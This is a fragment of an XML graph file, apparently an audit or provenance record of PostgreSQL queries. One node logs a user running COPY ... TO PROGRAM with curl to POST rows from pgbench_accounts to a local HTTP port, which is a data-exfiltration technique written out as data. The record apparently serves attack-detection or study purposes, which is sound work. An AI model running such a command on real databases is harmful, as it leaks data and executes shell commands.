    <node id="('Query', 22754)">
      <data key="d3">Query</data>
      <data key="d19">123038</data>
      <data key="d20">1788642508</data>
      <data key="d21">123038</data>
      <data key="d7">1788642508.0</data>
      <data key="d22">ProcessUtility</data>
      <data key="d23">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true';</data>
      <data key="d24">casce_tpcb</data>
      <data key="d25">dev_charlie</data>
      <data key="d26">192.168.1.103</data>
      <data key="d27">63038</data>
      <data key="d11">123038</data>
      <data key="d12">22754</data>
      <data key="d13">postgres</data>
      <data key="d14">1788642508.0</data>
